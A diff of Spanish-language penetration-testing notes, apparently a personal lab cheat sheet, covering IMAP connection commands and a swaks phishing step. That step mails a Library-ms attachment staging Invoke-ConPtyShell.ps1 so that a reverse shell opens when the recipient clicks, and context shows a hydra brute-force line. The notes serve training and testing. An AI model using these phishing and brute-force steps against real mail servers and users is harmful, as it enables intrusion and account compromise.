@@ -26,13 +26,16 @@ QUIT
 #### `openssl`
 
 ```bash
+# Si es conexión normal -143 
+telnet $target 143
+# Si es conexión SSL - 993
 openssl s_client -connect $target:imaps
 # Después de recibir toda la inforamción podemos conectarnos del siguiente modo
 a LOGIN your_username your_password
 # listar carpetas de correo
 a LIST "" "*"
 # Para ver los correos de una carpeta específica (sopongamos que en list aparece INBOX)
-a INBOX
+a SELECT INBOX
 # Para leer los correos debemos escribir FETCH seguido del ID del correo
 a FETCH 1 BODY[TEXT]
 # podríamos haber puesto BODY[HEADER], BODY[1] (texto plano)
@@ -312,6 +315,6 @@ hydra -L users.txt -P passwords.txt imap://$target
 	- `Invoke-ConPtyShell.ps1`: Lo copiamos desde nuestra kali para el ataque
 - Supongamos que `$target` es el servidor SMTP, que tenemos un correo al que envíar información (`dave.wizard@supermagicorg.com`) y credenciales válidas para el usuario `test`, que tiene correo  `test@supermagicorg.com` y password `test`
 	```bash
-	 sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com --attach @config.Library-ms --server $target --body @body.txt --header "Subject: Staging Script" --suppress-data --auth-user test@supermagicorg.com --auth-password 'test'
+	 sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com,anita@supermagicorg.com --attach @config.Library-ms --server $target --body @body.txt --header "Subject: Staging Script" --suppress-data --auth-user test@supermagicorg.com --auth-password 'test'
 	```
 - Tras ponernos en escucha en nuestra pwnbox deberíamos recibir una revshell si el usuario pincha en el correo
